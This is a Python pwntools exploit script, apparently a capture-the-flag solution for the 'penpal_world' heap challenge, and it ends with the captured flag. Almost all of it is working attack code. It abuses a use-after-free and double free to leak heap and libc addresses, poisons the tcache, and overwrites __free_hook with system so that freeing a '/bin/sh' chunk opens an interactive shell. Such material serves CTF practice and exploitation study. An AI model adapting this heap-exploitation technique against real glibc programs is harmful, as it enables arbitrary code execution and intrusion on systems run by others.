from pwn import *

counter = 0


MENU = (
"OPTIONS\n"
"1) Create a postcard\n"
"2) Edit a postcard\n"
"3) Discard a postcard\n"
"4) Read a postcard"
)
def add(io, idx):
	assert idx in range(0, 2)
	io.recvuntil(MENU)
	io.sendline("1")
	io.recvuntil("Which envelope #?\n")
	io.sendline(str(idx))
	global counter
	counter += 1

def edit(io, idx, content):
	assert idx in range(0, 2)
	assert len(content) <= 0x48
	io.recvuntil(MENU)
	io.sendline("2")
	io.recvuntil("Which envelope #?\n")
	io.sendline(str(idx))
	io.recvuntil("Write.\n")
	io.send(content)
	global counter
	counter += 1

def discard(io, idx):
	assert idx in range(0, 2)
	io.recvuntil(MENU)
	io.sendline("3")
	io.recvuntil("Which envelope #?\n")
	io.sendline(str(idx))
	global counter
	counter += 1

def display(io, idx):
	assert idx in range(0, 2)
	io.recvuntil(MENU)
	io.sendline("4")
	io.recvuntil("Which envelope #?\n")
	io.sendline(str(idx))
	global counter
	counter += 1

	
	

def exploit():
	global counter
	#io = remote("chall.2019.redpwn.net", 4010)
	io = process("./penpal_world")

	#get heap leak
	for i in range(0, 2):
		add(io, 0)

	for i in range(0, 3):
		discard(io, 0)

	display(io, 0)
	heap = u64(io.recv(6).ljust(8, "\x00")) - 80
	log.success("heap {}".format(hex(heap)))

	edit(io, 0, p64(heap))
	add(io, 0)
	#like new
	add(io, 0)

	#first stage get libc leak
	#create a fake small bin
	#free this small bin 7 times

	chunk  = p64(0x0)
	chunk += p64(0x91) #small bin size
	edit(io, 0, chunk)

	add(io, 1)
	chunk  = p64(0x0)*8
	chunk += p64(0x90) #prev size
	edit(io, 1, chunk)
	

	discard(io, 1)
	edit(io, 1, p64(heap + 0x10))
	add(io, 1)
	add(io, 1)
	
	for i in range(0, 8):
		discard(io, 1)

	#fill so we can leak pointers
	edit(io, 0, 'A'*16)
	display(io, 0)
	io.recvuntil("A"*16)	
	malloc_hook = u64(io.recv(6).ljust(8, "\x00")) - 0x70

	libc      = malloc_hook - 0x0000000003ebc30
	system 		= libc + 0x000000000004f440
	free_hook = libc + 0x00000000003ed8e8
	assert libc & 0xfff == 0


	log.success("malloc_hook {}".format(hex(malloc_hook)))
	log.success("free_hook {}".format(hex(free_hook)))
	log.success("libc {}".format(hex(libc)))
	log.success("system {}".format(hex(system)))
	
	discard(io, 0)
	discard(io, 0)
	edit(io, 0, p64(free_hook))	
	add(io, 0)
	add(io, 0)
	edit(io, 0, p64(system))

	edit(io, 1, "/bin/sh")
	discard(io, 1)

	log.info("USED {}".format(str(counter)))
	
	#SHELL
	io.interactive()
	io.close()


#flag{0h_n0e5_sW1p3r_d1D_5w!peEEeE}
exploit()	
